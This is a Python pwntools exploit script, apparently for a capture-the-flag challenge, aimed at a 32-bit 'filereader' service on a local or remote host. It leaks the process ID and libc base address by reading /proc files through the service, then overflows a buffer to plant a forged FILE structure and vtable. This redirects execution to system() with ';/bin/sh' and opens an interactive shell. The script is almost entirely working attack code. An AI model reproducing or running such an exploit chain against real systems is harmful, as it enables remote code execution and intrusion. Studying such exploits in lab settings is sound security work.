#! /usr/bin/env python3

import time
import struct
from os.path import realpath
import argparse
from pwn import *

context(arch = 'i386', os = 'linux', endian='little') # Context of target binary

ld_path = realpath("ld-2.23.so")
lib_path = realpath(".")

bin_fname = b'filereader'
bin_path = realpath(bin_fname.decode())

# Commands of the filereader:
cmd_open = "1"
cmd_read = "2"
cmd_print = "3"
cmd_close = "4"
cmd_exit = "5"

fp_addr = 0x804b280 # Address of the global variable 'fp' from the target binary
system_offset = 0x3ada0 # Offset of libc where system() is located

pid_max = 32768 # Maximum possible PID

sizeof_file = 152 # Size of the FILE struct in i386 (bytes)
sizeof_vtable = 21 # Size of the vtable in i386 (words)

shell_cmd = b';/bin/sh' # Semicolon + command line to invoke the shell

padding = b'\x00'

flags = 0x80018001 # Flags of the fake FILE struct to be built

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("--remote", dest="local", help="Perform exploit on remote server", action="store_false")
    parser.add_argument("--local", dest="local", help="Perform exploit locally", action="store_true")
    parser.add_argument("--host", dest="host", help="Host of remote server", default="10.0.23.80")
    parser.add_argument("--port", dest="port", help="Port of remote server to exploit", default="31337")
    options = parser.parse_args()
    return options

# This avoids a lot of problems, specially when sending stuff to remote:
def safe_send(p, cmdline):
    p.sendline(cmdline)
    time.sleep(0.1)
    return p.recv()

# Attempt to find out the PID of the filereader process by trying to read /proc/PID/cmdline for all PIDs:
def pid_brute_force(p):

    l = log.progress("Attempting to brute-force the PID on remote server")

    # For all PIDs (except 0):
    for pid in range(1, pid_max):
        # Try to open /proc/pid/cmdline using the filereader:
        recvd = safe_send(p, cmd_open)
        recvd = safe_send(p, "/proc/" + str(pid) + "/cmdline")

        if b'Open Successful' in recvd:
            # Retrieve the contents of the file using filereader:
            safe_send(p, cmd_read)
            recvd = safe_send(p, cmd_print)
            safe_send(p, cmd_close)

            # If the name of the executable is on the command line used to spawn the process,
            # this is the filereader process:
            if bin_fname in recvd:
                l.success(str(pid))
                return pid

    l.warning("FAILURE")

    return None

# Given the PID of the filereader, try to find the address libc was loaded to by reading /proc/PID/maps:
def libc_find(p, pid):

    l = log.progress("Attempting to find libc base address on process files")

    # Open /proc/pid/maps using the filereader:
    safe_send(p, cmd_open)
    recvd = safe_send(p, "/proc/" + str(pid) + "/maps")

    # This condition will only be met if the whole file has been read:
    while not b'\n\n' in recvd:
        # Retrieve the contents of the file using filereader:
        safe_send(p, cmd_read)
        recvd = safe_send(p, cmd_print)

        # Check if the line we are interested in has been read:
        for line in recvd.splitlines():
            if b'libc' in line:
                libc_base = int(line[:8], 16)
                l.success(str(hex(libc_base)))
                return libc_base

    l.warning("FAILURE")

    return None

# Craft a FILE struct in i386:
def file_struct_craft(fp, addr):

    fl = p32(flags) # First field of struct (flags)
    fl += shell_cmd # Place the command line to be executed
    fl += padding * (sizeof_file - len(p32(flags)) - len(shell_cmd) - 0x4) # Fill the struct except for the last field
    fl += p32(fp + sizeof_file) # Fill the last field (vtable) with a pointer to the next position
    fl += p32(addr) * sizeof_vtable # Craft a vtable to redirect the flow to "addr"

    return fl

def perform_attack(p, addr):

    name = padding * 32 # Contents of variable 'name'
    fake_fp = fp_addr + 0x4 # Fake pointer that will overwrite 'fp'
    fake_file = file_struct_craft(fake_fp, addr) # Fake FILE struct

    payload = name + p32(fake_fp) + fake_file # Data to be passed as input

    # Exit program:
    safe_send(p, cmd_exit)

    # Perform buffer overflow attack on the 'name' buffer:
    p.write(payload)
    safe_send(p, "")

    log.info("Spawning shell")

    p.interactive()

if __name__ == "__main__":

    opt = get_arguments()

    if opt.local:
        # Spawn a local filereader process, explicitly linking it with the provided linker to the provided libc:
        p = process(argv=[ld_path, bin_path], env={"LD_LIBRARY_PATH":lib_path})
        pid = p.pid # Get its PID
    else:
        p = remote(opt.host, int(opt.port)) # Connect to remote host
        pid = pid_brute_force(p) # Try to get the PID by brute-force
        if not pid:
            quit()

    # Try to get the libc base address:
    libc_base = libc_find(p, pid)

    if not libc_base:
        quit()

    # Perform the attack by redirecting the flow to system():
    perform_attack(p, libc_base + system_offset)
